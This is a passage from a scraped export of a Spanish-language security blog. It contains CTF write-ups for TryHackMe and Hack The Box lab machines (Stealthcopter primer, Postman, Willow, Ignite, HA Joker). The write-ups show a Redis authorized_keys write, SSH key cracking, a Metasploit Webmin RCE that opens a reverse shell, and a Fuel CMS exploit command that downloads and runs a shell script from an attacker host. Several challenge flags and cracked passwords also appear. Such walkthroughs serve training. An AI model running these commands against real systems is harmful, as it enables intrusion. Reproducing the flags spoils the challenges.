[rbp-0x66],0x74 0x000000000000120c \u0026lt;+99\u0026gt;:\tmov BYTE PTR [rbp-0x65],0x7d [... snip ...]   HEX\n1  46 4c 41 47 7b 69 6e 63 6f 72 72 65 63 74 7d   FLAG\n1  FLAG{incorrect}   Con la frase correcta:\n1 2 3 4 5 6  sckull@uplifted:~/tmp/forensics$ ./f.08 Hello, please enter the flag: FLAG{incorrect} Well done, you got the flag correct!!! sckull@uplifted:~/tmp/forensics$   f.09 1 2 3 4 5 6 7 8 9  0f4d0db3668dd58cabb9eb409657eaa8 { d015cc465bdb4e51987df7fb870472d3fb9a3505 _ _ b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86 _ d04b98f48e8f8bcc15c6ae5ac050801cd6dcfd428fb5f9e65c4e16e7807340fa }   f.10 Brainfuck Language\nNetworking n.01.pcap Filtro: HTTP GET\nFLAG{n0w_y0ur_g3tt1ng_1t}\nn.02.pcap Filtro: HTTP POST\nFLAG{1_am_th3_p0stm4n}\nn.03.pcap USER AGENT\nFLAG{s3cr3t_ag3nt}\nn.04.pcap OBJECTS HTTP\nFLAG{h3r3_1_am}\nn.05.pcap SMB\nSMB OBJECT\n1 2 3 4 5  sckull@uplifted:~/tmp/networking$ tar -xvf smb_object05.tar flag.txt sckull@uplifted:~/tmp/networking$ cat flag.txt FLAG{smb_smb_smb_smb_smb_smb} sckull@uplifted:~/tmp/networking$   n.06.pcap FTP\nFLAG{1n3s3cur3_\nTELNET\npr0t0c0ls}\nFLAG{1n3s3cur3_pr0t0c0ls}\nn.07.pcap DNS\n1  46 4c 41 47 7b 64 6e 73 5f 33 78 66 31 6c 74 72 34 74 30 72 7d   https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')\u0026amp;input=NDYgNGMgNDEgNDcgN2IgNjQgNmUgNzMgNWYgMzMgNzggNjYgMzEgNmMgNzQgNzIgMzQgNzQgMzAgNzIgN2Q FLAG{dns_3xf1ltr4t0r}\nn.08.pcap tcp and data\nFLAG{this is a hidden flag}\nn.09 7z File\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  sckull@uplifted:~/tmp/networking$ file n.09 n.09: 7-zip archive data, version 0.3 sckull@uplifted:~/tmp/networking$ xxd n.09 | head 00000000: 377a bcaf 271c 0003 46c0 dcbf d40b 0000 7z..\u0026#39;...F....... 00000010: 0000 0000 2300 0000 0000 0000 cf09 fa64 ....#..........d 00000020: 0068 33be 1c86 3077 60f4 a484 2585 fa1c .h3...0w`...%... 00000030: 7627 82f2 9186 dc88 ca27 bae3 fb13 c5ff v\u0026#39;.......\u0026#39;...... 00000040: 0e24 c288 d1b1 0114 695f 90fd b8ca a6d3 .$......i_...... 00000050: 2f38 db8c 915e 7e32 f588 4d5c 3f35 4a84 /8...^~2..M\\?5J. 00000060: 242d b5f0 8c96 a4e0 ce62 7105 5389 18f1 $-.......bq.S... 00000070: e946 8af0 1d2f a762 e91a 934b 32a6 7eb8 .F.../.b...K2.~. 00000080: 8322 16d1 2abc 32be 2107 1dae 03ac 6edf .\u0026#34;..*.2.!.....n. 00000090: e042 8551 7d12 e93f 57e4 fa2b 4f3d a993 .B.Q}..?W..+O=.. sckull@uplifted:~/tmp/networking$mv n.09 n.09.7z sckull@uplifted:~/tmp/networking$7z e n.09.7z 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 3095 bytes (4 KiB) Extracting archive: n.09.7z -- Path = n.09.7z Type = 7z Physical Size = 3095 Headers Size = 198 Method = LZMA:23 Solid = + Blocks = 1 Everything is Ok Files: 2 Size: 26112 Compressed: 3095 sckull@uplifted:~/tmp/networking$sckull@uplifted:~/tmp/networking$strings *.msg| grep FL FLAG\\{sn41L_m41L\\} FLAG{sn41L_m41L}\u0026lt;br\u0026gt; sckull@uplifted:~/tmp/networking$  n.10.pcap SSL Certificate\nSSL Wireshark: Edit \u0026gt; Preferences \u0026gt; Protocols \u0026gt; SSL \u0026gt; (Pre)-Master-Secret log filename \u0026gt; Select n.10.ssl.log\nFLAG{y0u_ar3_c3rt1f13d_n0w}\n","description":"Stealthcopter CTF Primer es una serie de retos de TryHackMe donde utilizamos distintas herramientas para resolver los retos.","id":96,"section":"posts","tags":[],"title":"TryHackMe - Stealthcopter CTF Primer1","uri":"https://sckull.github.io/posts/stealthcopter/"},{"content":"  Postman es una maquina de HackTheBox que expone Redis donde logramos escribir nuestra clave publica de SSH y obtener acceso por este. Encontramos una clave privada encriptada la cual crackeamos con John para obtener acceso al siguiente usuario. Finalmente accedimos a Webmin y explotamos una vulnerabilidad que nos dio acceso privilegiado.\nInformacion de la Maquina    Nombre Postman      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.160   Maker TheCyberGeek    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[7, 6.2, 7.8, 2.2, 3.8], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[9, 7, 10, 0, 3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  # Nmap 7.80 scan initiated Thu Dec 26 14:42:29 2019 as: nmap -p- --min-rate 1000 -o postman_nmap 10.10.10.160 Warning: 10.10.10.160 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.160 Host is up (0.26s latency). Not shown: 65213 closed ports, 318 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 6379/tcp open redis 10000/tcp open snet-sensor-mgmt # Nmap done at Thu Dec 26 14:45:40 2019 -- 1 IP address (1 host up) scanned in 191.74 seconds # Nmap 7.80 scan initiated Thu Dec 26 14:46:53 2019 as: nmap -sV -sC -p22,80,6379,10000 -o postman_nmap_v 10.10.10.160 Nmap scan report for 10.10.10.160 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA) | 256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA) |_ 256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: The Cyber Geek\u0026#39;s Personal Website 6379/tcp open redis Redis key-value store 4.0.9 10000/tcp open http MiniServ 1.910 (Webmin httpd) |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Dec 26 14:47:36 2019 -- 1 IP address (1 host up) scanned in 43.58 seconds   HTTP (Puerto 80) En el puerto 80 nos muestra una pagina que al parecer esta en construccion.\nPUERTO 6379 En el puerto 6379 nos muestra un mensaje de error.\nPUERTO 10000 En este puerto nos muestra un mensaje de error en el cual nos dice que probemos en el protocolo https.\nCambiamos a https y nos muestra un panel de Webmin.\nGOBUSTER - Puerto 80 Encontramos algunos directorios y archivos.\n1 2 3 4 5 6 7 8 9  root@aoiri:~/htb/postman# gobuster dir -u http://10.10.10.160/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 15 -q /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /server-status (Status: 403) /upload (Status: 301)   REDIS PUERTO 6379 Como vimos en el reporte de nmap este puerto esta corriendo un servicio de redis 4.0.9. Al intentar conectarnos con el servicio mediante redis-tools podemos obtener informacion del mismo.\nREDIS - Explotacion Utilizando los comandos de redis podemos obtener informacion del directorio donde esta corriendo o esta siendo utilizado por redis, tambien el nombre del archivo (dbfilename).\nVemos que la configuracion del dbfilename es dump.rdb y el directorio esta ubicado en /var/lib/redis, para obtener acceso a la maquina mediante redis vamos a sobrescribir la configuracion, agregando el dbfilename como authorized_keys donde vamos a escribir nuestra clave publica de ssh y dir como /var/lib/redis/.ssh.\nREDIS SSH Generamos nuestra clave publica con ssh-keygen la cual vamos a utilizar para iniciar sesion en el servicio ssh.\nAntes de configurar redis debemos de agregar saltos de linea antes y despues en nuevo archivo agregando nuestra clave publica.\n1  (echo -e \u0026#34;\\n\\n\u0026#34;; cat id_rsa.pub; echo -e \u0026#34;\\n\\n\u0026#34;) \u0026gt; clave_publica.txt   Utilizamos redis-cli localmente para agregar la configuracion que necesitamos a la maquina, con los comandos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  #Configuracion dir redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh config get dir #Configuracion dbfilename config set dbfilename authorized_keys config get dbfilename SLAVEOF NO ONE save #Escritura de clave publica en nuestra key cat clave_publica.txt | redis-cli -h 10.10.10.160 -x set s-key get s-key   Verificamos que nuestra clave publica se haya escrito en nuestra key (s-key):\nUtilizando nuestra clave privada iniciamos sesion con el usuario redis:\nVemos el historial del usuario redis, encontramos que el usuario edito un archivo de python y un archivo de id_rsa.bak:\nArchivo id_rsa.bak:\nUSER - Matt Utilizando la clave privada con el usuario Matt con ssh nos pregunta por la frase.\nUtilizamos ssh2john para obtener el hash del archivo y junto con john the ripper crackear la frase de la clave privada.\n1 2  python ssh2john.py id_rsa_matt \u0026gt; id_rsa_matt.hash john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_matt.hash   FRASE: computer2008\nObtenemos la frase pero al intentar utilizarla con la clave privada no nos permite iniciars sesion.\nUtilizamos la misma frase como contraseña de Matt y con el comando su, obtuvimos una shell con el usuario Matt y nuestra flag user.txt.\nFlag:\nPRIVILEGE ESCALATION Utilizamos las credenciales de Matt en el puerto 10000 o webmin panel, exitosamente logramos iniciar sesion.\nLa version de webmin menores o iguales a 1.910 tienen una vulnerabilidad (CVE:2019-12840) que permite la ejecucion de comandos, configuramos metasploit con el cve, añadimos las credenciales de Matt y utilizamos SSL.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98  msf5 \u0026gt; search 2019-12840 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/http/webmin_packageup_rce 2019-05-16 excellent Yes Webmin Package Updates Remote Command Execution msf5 \u0026gt; use exploit/linux/http/webmin_packageup_rce msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; show options Module options (exploit/linux/http/webmin_packageup_rce): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes Webmin Password Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 10000 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Base path for Webmin application USERNAME yes Webmin Username VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Webmin \u0026lt;= 1.910 msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; set rhosts 10.10.10.160 rhosts =\u0026gt; 10.10.10.160 msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; show options Module options (exploit/linux/http/webmin_packageup_rce): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes Webmin Password Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.160 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 10000 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Base path for Webmin application USERNAME yes Webmin Username VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Webmin \u0026lt;= 1.910 msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; set lhost tun0 lhost =\u0026gt; 10.10.14.67 msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; set USERNAME Matt USERNAME =\u0026gt; Matt msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; set PASSWORD computer2008 PASSWORD =\u0026gt; computer2008 msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; set SSL true SSL =\u0026gt; true msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.67:4444 [+] Session cookie: 4c7f4b517283e96d41da23ced104e00a [*] Attempting to execute the payload... [*] Command shell session 1 opened (10.10.14.67:4444 -\u0026gt; 10.10.10.160:42436) at 2019-12-29 22:13:48 -0600 id uid=0(root) gid=0(root) groups=0(root) whoami; pwd root /usr/share/webmin/package-updates/   Obtenemos una sesion con privilegios root y nuestra flag root.txt.\n","description":"Postman es una maquina de HackTheBox que expone Redis donde logramos escribir nuestra clave publica de SSH y obtener acceso por este. Encontramos una clave privada encriptada la cual crackeamos con John para obtener acceso al siguiente usuario. Finalmente accedimos a Webmin y explotamos una vulnerabilidad que nos dio acceso privilegiado.","id":97,"section":"posts","tags":["webmin","redis-cli","metasploit"],"title":"Hack The Box - Postman","uri":"https://sckull.github.io/posts/postman/"},{"content":"  Willow es una maquina de TryHackMe, encontramos un reto que nos permitio generar una clave privada encriptada a la cual encontramos la frase secreta con John lo que nos permitio obtener acceso por SSH. Encontramos credenciales al montar una particion, con ello logramos acceder como root.\nRoom    Titulo Willow      Descripción What lies under the Willow Tree?   Puntos 60   Dificultad Media   Maker MuirlandOracle     NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13  # Nmap 7.80 scan initiated Fri Feb 28 14:00:08 2020 as: nmap -sV -p- --min-rate=1000 -o nmap_rate willow.thm Nmap scan report for willow.thm Host is up (0.19s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) 80/tcp open http Apache httpd 2.4.10 ((Debian)) 111/tcp open rpcbind 2-4 (RPC #100000) 2049/tcp open nfs 2-4 (RPC #100003) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 28 14:01:52 2020 -- 1 IP address (1 host up) scanned in 103.49 seconds   HTTP GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4  root@aoiri:~/tryhackme/new_rom# gobuster dir -u http://willow.thm/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 25 -x php,html,txt /index.html (Status: 200) /index.html (Status: 200) /server-status (Status: 403)   USER - Willow PRIVATE KEY En la pagina principal de willow encontramos una cadena en hexadecimal.\nUtilizamos CyberChef para decodificar el contenido de esta cadena.\nÈncontramos un mensaje en el que indica que la clave privada de Willow esta encriptada - Asumimos que willow es un usuario registrado en la maquina:\nHey Willow, here's your SSH Private key -- you know where the decryption key is! Adjunto al mensaje, una lista de numeros.\nNFS En el puerto 2049 encontramos un punto de montaje el cual puede utilizar cualquiera (nobody:nogroup), utilizamos mount para montar la carpeta permitida (/var/failsafe).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  root@aoiri:~/tryhackme/willow# showmount -e willow.thm Export list for willow.thm: /var/failsafe * root@aoiri:~/tryhackme/willow# mkdir tmp_nfs root@aoiri:~/tryhackme/willow# pwd /root/tryhackme/willow root@aoiri:~/tryhackme/willow# mount -t nfs willow.thm:/var/failsafe /root/tryhackme/willow/tmp_nfs/ root@aoiri:~/tryhackme/willow# ls tmp_nfs/ rsa_keys root@aoiri:~/tryhackme/willow# cd tmp_nfs/ root@aoiri:~/tryhackme/willow/tmp_nfs# cat rsa_keys Public Key Pair: (23, *****) Private Key Pair: (*****, *****) root@aoiri:~/tryhackme/willow/tmp_nfs# ls -lah total 12K drwxr--r-- 2 nobody nogroup 4.0K Jan 30 10:31 . drwxr-xr-x 3 root root 4.0K Feb 28 14:05 .. -rw-r--r-- 1 root root 62 Jan 30 10:31 rsa_keys root@aoiri:~/tryhackme/willow/tmp_nfs#   El contenido del archivo que encontramos en la carpeta es rsa_keys que contiene las claves para la clave publica y la clave privada.\n1 2 3  root@aoiri:~/tryhackme/willow/tmp_nfs# cat rsa_keys Public Key Pair: (23, *****) Private Key Pair: (*****, *****)   En este post RSA Encription explica a la perfeccion como funcionan, encriptacion y desencriptacion de RSA. Para este reto escribi un pequeño script en python que por cada numero que encontramos en el mensaje, lo vamos a convertir a hexadecimal utilizando las claves (6\u0026mdash;7, 3\u0026mdash;7) del archivo rsa_keys, en este caso vamos a utilizar el de la clave privada para poder conectarnos atraves del servicio SSH. Una vez hecho lo anterior convertimos a texto el mensaje (lista) en hexadecimal que obtuvimos.\nEjecutamos nuestro script y obtenemos nuestra clave privada:\nUtilizamos la clave para iniciar sesion en el servicio de SSH pero esta esta protegida por una frase.\nUtilizamos John para obtener el hash de la clave y obtener la frase.\nUna vez con la frase de nuestro archivo, iniciamos sesion en el servicio SSH y obtenemos nuestra shell con usuario Willow.\nEncontramos una imagen en la carpeta principal de Willow:\nLa codificamos a base64 y utilizamos nuevamente CyberChef para renderizar nuestra imagen (podemos utilizar scp btw), obtenemos nuestra flag user.txt:\nPRIVILEGE ESCALATION Enumeramos los comandos que podemos ejecutar sin contraseña utilizando sudo sudo -l -l y vemos que podemos utilizar mount.\nRevisamos /mnt/ y encontramos la carpeta /creds que no contiene nada.\nVemos el contenido de /dev en donde se supone estan las \u0026ldquo;particiones\u0026rdquo; montadas, y podemos ver inmediatamente hidden_backup lo cual no es muy comun de encontrar.\nYa que podemos utilizar mount con sudo vamos a proceder a montar esta \u0026ldquo;particion\u0026rdquo; en /mnt/creds (puede ser en cualquier otra carpeta a la que willow tenga acceso).\nEncontramos las credenciales del usuario root y willow, cambiamos al usuario root y dentro de su carpeta encontramos un mensaje en root.txt.\nLa nota nos indica que la flag root.txt ya nos fue dada antes de que obtuvieramos una shell, recordemos que la primera flag la encontramos en la imagen, regresamos a la imagen que encontramos y extraemos su contenido con la contraseña de root, en donde podemos ver nuestra ultima flag.\n","description":"Willow es una maquina de TryHackMe, encontramos un reto que nos permitio generar una clave privada encriptada a la cual encontramos la frase secreta con John lo que nos permitio obtener acceso por SSH. Encontramos credenciales al montar una particion, con ello logramos acceder como root.","id":98,"section":"posts","tags":["nfs","showmount","steghide","steganography"],"title":"TryHackMe - Willow","uri":"https://sckull.github.io/posts/willow/"},{"content":"  Ignite es una maquina de TryHackMe, se presenta Fuel CMS donde explotamos una vulnerabilidad para obtener acceso mediante una shell y finalmente escalamos privilegios con contraseñas almacenadas.\nRoom    Titulo Ignite      Descripción A new start-up has a few issues with their web server.   Puntos 110   Dificultad Facil   Maker DarkStar7471     NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9  # Nmap 7.80 scan initiated Mon Mar 2 17:50:06 2020 as: nmap -sV -p- --min-rate=1000 -o nmap_rate 10.10.169.161 Nmap scan report for 10.10.169.161 Host is up (0.20s latency). Not shown: 65534 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Mar 2 17:51:40 2020 -- 1 IP address (1 host up) scanned in 94.48 seconds   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11  root@aoiri:~/tryhackme/ignite# gobuster dir -u ignite.thm -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 15 -x php,html,txt /0 (Status: 200) /assets (Status: 301) /home (Status: 200) /index (Status: 200) /index.php (Status: 200) /index.php (Status: 200) /offline (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403)   HTTP Pagina en el puerto 80, en esta nos muestra los pasos que se deben de seguir para instalar el Fuel CMS.\nEn una de las instrucciones nos muestra las credenciales para ingresar en el dashboard de este CMS.\nEntramos en el CMS con las credenciales.\nRCE Fuel CMS 1.4.1 Buscamos un exploit para este CMS encontramos uno para ejecutar comandos, este exploit necesita burpsuite para poder funcionar en el puerto 8080 aunque no es necesario. Ejecutamos un comando y vemos los archivos del sistema.\nFuel CMS 1.4.1\nCreamos un archivo bash en el que contiene nuestra shell inversa, descargamos y ejecutamos nuestra shell.\nExploit:\n1  cmd:wget 10.8.1.72/shell.sh \u0026amp;\u0026amp; bash shell.sh   Obtenemos una shell inversa con el usuario www-data.\nEncontramos nuestra flag user.txt en la carpeta /home.\nPRIVILEGE ESCALATION Enumeramos los archivos en la maquina, en los archivos del CMS encontramos las credenciales de la base de datos.\nUtilizamos su con la contraseña de root y obtenemos una shell y nuestra flag root.txt.\n","description":"Ignite es una maquina de TryHackMe, se presenta Fuel CMS donde explotamos una vulnerabilidad para obtener acceso mediante una shell y finalmente escalamos privilegios con contraseñas almacenadas.","id":99,"section":"posts","tags":["Fuel CMS"],"title":"TryHackMe - Ignite","uri":"https://sckull.github.io/posts/ignite/"},{"content":"  HA Joker CTF es una maquina de TryHackMe, enfocada en la tematica de Joker donde descubrimos un login donde utilizamos Hydra para obtener acceso, que luego nos permitió obtener un backup de la base de datos de Joomla, y con este ultimo obtuvimos acceso modificando una plantilla. Finalmente escalamos privilegios creando un nuevo contenedor con privilegios con lxc.\nRoom    Titulo HA Joker CTF      Descripción Batman hits Joker.   Puntos 500   Dificultad Media   Maker ki11switch     NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13  # Nmap 7.80 scan initiated Thu Feb 27 14:33:03 2020 as: nmap -sV -p- --min-rate=1000 -o nmap_rate jokerctf.thm Warning: 10.10.171.105 giving up on port because retransmission cap hit (10). Nmap scan report for jokerctf.thm (10.10.171.105) Host is up (0.24s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 8080/tcp open http Apache httpd 2.4.29 Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 27 14:34:50 2020 -- 1 IP address (1 host up) scanned in 107.72 seconds   HTTP En el puerto 80 encontramos una pagina que nos muestra distintas imagenes del joker.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10  root@aoiri:~/tryhackme/jokerctf# gobuster dir -u http://jokerctf.thm/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 15 -x php,html,txt /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /phpinfo.php (Status: 200) /phpinfo.php (Status: 200) /secret.txt (Status: 200) /server-status (Status: 403) root@aoiri:~/tryhackme/jokerctf#   /secret.txt HTTP - Puerto 8080 En el puerto 8080 encontramos un panel donde nos pide un usuario y contraseña.\nHydra Utilizamos hydra con los usuarios joker y batman junto con el wordlist rockyou.txt en el puerto 8080.\nAl iniciar sesion con las credenciales vemos una nueva pagina, a simple vista podemos ver que es un CMS Joomla.\nRUSTBUSTER Utilizamos RUSTBUSTER para busqueda de directorios y archivos (por alguna razon gobuster no aceptaba los headers).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65  root@aoiri:~/tryhackme/jokerctf# /opt/rustbuster/rustbuster dir -u http://jokerctf.thm:8080/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -t 25 -e php,html,txt -H \u0026#34;Authorization: Basic am9rZXI6aGFubmFo,Cookie: 5fef75b50575ebea33a28bd1e7087dcb=et845u1qtnkv5io3ak6msfmdim; 0d073d2ec68ac2f24f859831bbe8843b=3r1udjnnh7dk8bv4jt7gpadh5r\u0026#34; ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~tarted at\t: 2020-02-27 16:01:01 GET\t403 Forbidden\thttp://jokerctf.thm:8080/.html GET 403 Forbidden http://jokerctf.thm:8080/.php GET 200 OK http://jokerctf.thm:8080/ GET 301 Moved Permanently http://jokerctf.thm:8080/administrator =\u0026gt; http://jokerctf.thm/administrator/ GET 200 OK http://jokerctf.thm:8080/backup GET 200 OK http://jokerctf.thm:8080/backup.zip GET 301 Moved Permanently http://jokerctf.thm:8080/bin =\u0026gt; http://jokerctf.thm/bin/ GET 301 Moved Permanently http://jokerctf.thm:8080/cache =\u0026gt; http://jokerctf.thm/cache/ GET 301 Moved Permanently http://jokerctf.thm:8080/components =\u0026gt; http://jokerctf.thm/components/ GET 200 OK http://jokerctf.thm:8080/configuration.php GET 301 Moved Permanently http://jokerctf.thm:8080/images =\u0026gt; http://jokerctf.thm/images/ GET 301 Moved Permanently http://jokerctf.thm:8080/includes =\u0026gt; http://jokerctf.thm/includes/ GET 200 OK http://jokerctf.thm:8080/index.php GET 200 OK http://jokerctf.thm:8080/index.php GET 301 Moved Permanently http://jokerctf.thm:8080/language =\u0026gt; http://jokerctf.thm/language/ GET 301 Moved Permanently http://jokerctf.thm:8080/layouts =\u0026gt; http://jokerctf.thm/layouts/ GET 301 Moved Permanently http://jokerctf.thm:8080/libraries =\u0026gt; http://jokerctf.thm/libraries/ GET 200 OK http://jokerctf.thm:8080/LICENSE GET 200 OK http://jokerctf.thm:8080/LICENSE.txt GET 301 Moved Permanently http://jokerctf.thm:8080/media =\u0026gt; http://jokerctf.thm/media/ GET 301 Moved Permanently http://jokerctf.thm:8080/modules =\u0026gt; http://jokerctf.thm/modules/ GET 301 Moved Permanently http://jokerctf.thm:8080/plugins =\u0026gt; http://jokerctf.thm/plugins/ GET 200 OK http://jokerctf.thm:8080/README GET 200 OK http://jokerctf.thm:8080/README.txt GET 200 OK http://jokerctf.thm:8080/robots GET 200 OK http://jokerctf.thm:8080/robots.txt GET 200 OK http://jokerctf.thm:8080/robots.txt GET 403 Forbidden http://jokerctf.thm:8080/server-status GET 301 Moved Permanently http://jokerctf.thm:8080/templates =\u0026gt; http://jokerctf.thm/templates/ GET 301 Moved Permanently http://jokerctf.thm:8080/tmp =\u0026gt; http://jokerctf.thm/tmp/ GET 200 OK http://jokerctf.thm:8080/web.config GET 200 OK http://jokerctf.thm:8080/web.config.txt [?] Ended at: 2020-02-27 16:05:02   USER - www-data Encontramos un archivo backup.zip en la pagina protegido por contraseña, utilizamos la contraseña de joker que encontramos con hydra.\n1 2 3 4 5 6 7  root@aoiri:~/tryhackme/jokerctf# file backup.zip backup.zip: Zip archive data, at least v1.0 to extract root@aoiri:~/tryhackme/jokerctf# unzip backup.zip Archive: backup.zip creating: db/ [backup.zip] db/joomladb.sql password: skipping: db/joomladb.sql incorrect password   Encontramos un archivo de base de datos, dentro de los querys encontramos un insert en el que aparece la contraseña del usuario admin:\nCrackeamos la contraseña con john:\n1 2 3 